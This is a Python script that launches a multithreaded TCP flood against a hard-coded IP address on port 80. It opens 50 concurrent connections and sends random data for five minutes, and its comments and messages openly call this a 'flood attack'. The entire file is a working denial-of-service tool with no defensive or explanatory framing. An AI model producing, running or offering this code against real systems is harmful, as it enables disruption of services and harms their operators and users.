import socket
import threading
import time
import random
import string

# Configuration
TARGET_IP = "194.193.147.22"  # Replace with the target IP address
TARGET_PORT = 80  # Common port for HTTP traffic
PAYLOAD_SIZE = 1024  # Size of dummy data to send (in bytes)
THREADS = 50  # Number of concurrent threads to flood the target
DURATION = 300  # Duration of the attack in seconds (5 minutes)
TIMEOUT = 5  # Increased timeout for socket connection (in seconds)
MAX_RETRIES = 3  # Number of retries before giving up on a connection

# Function to generate random dummy data
def generate_payload(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

# Function to flood the target with data
def flood_target(thread_id):
    retries = 0
    while retries < MAX_RETRIES:
        try:
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            # Attempt to connect to the target
            sock.connect((TARGET_IP, TARGET_PORT))
            print(f"Thread {thread_id}: Connected to {TARGET_IP}:{TARGET_PORT}")
            
            # Send dummy data repeatedly
            end_time = time.time() + DURATION
            while time.time() < end_time:
                payload = generate_payload(PAYLOAD_SIZE)
                sock.send(payload)
                time.sleep(0.01)  # Small delay to avoid overwhelming the local system
            break  # Exit retry loop if successful
        except socket.timeout:
            retries += 1
            print(f"Thread {thread_id}: Connection timed out (Attempt {retries}/{MAX_RETRIES})")
            time.sleep(1)  # Wait before retrying
        except Exception as e:
            retries += 1
            print(f"Thread {thread_id}: Error - {e} (Attempt {retries}/{MAX_RETRIES})")
            time.sleep(1)  # Wait before retrying
        finally:
            sock.close()
    if retries >= MAX_RETRIES:
        print(f"Thread {thread_id}: Failed to connect after {MAX_RETRIES} attempts.")

# Main function to start multiple threads
def start_flood():
    print(f"Starting flood attack on {TARGET_IP}:{TARGET_PORT} with {THREADS} threads...")
    threads = []
    for i in range(THREADS):
        thread = threading.Thread(target=flood_target, args=(i,))
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    print("Flood attack completed.")

if __name__ == "__main__":
    start_flood()
